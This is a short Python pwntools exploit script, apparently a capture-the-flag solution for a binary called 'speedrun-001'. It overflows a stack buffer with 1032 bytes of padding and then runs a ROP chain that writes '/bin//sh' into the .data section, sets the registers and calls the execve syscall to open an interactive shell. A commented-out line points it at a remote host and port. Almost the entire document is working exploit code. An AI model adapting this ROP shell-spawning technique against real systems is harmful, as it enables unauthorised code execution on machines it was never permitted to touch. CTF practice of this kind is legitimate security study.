from pwn import *

r = process("./speedrun-001")
# r = remote("172.17.0.5", 31337)
e = ELF("./speedrun-001")
context.binary = e
rop = ROP(e)
pause()
print(r.recv())

rop.raw('A'*1032)
rop.raw(rop.rdx)
rop.raw("/bin//sh")
rop.raw(rop.rax)
rop.raw(0x00000000006b6000) # .data
rop.raw(0x48d251) # rdx -> [eax]
rop.raw(rop.rdi)
rop.raw(0x00000000006b6000) # .data
rop.raw(rop.rsi)
rop.raw(0x0)
rop.raw(rop.rdx)
rop.raw(0x0)
rop.raw(rop.rax)
rop.raw(0x3b) # execve syscall number
# rop.raw(rop.ret)
rop.raw(0x40129c) # syscall
# result is execve("/bin//sh", NULL, NULL)
r.sendline(rop.chain())
r.interactive()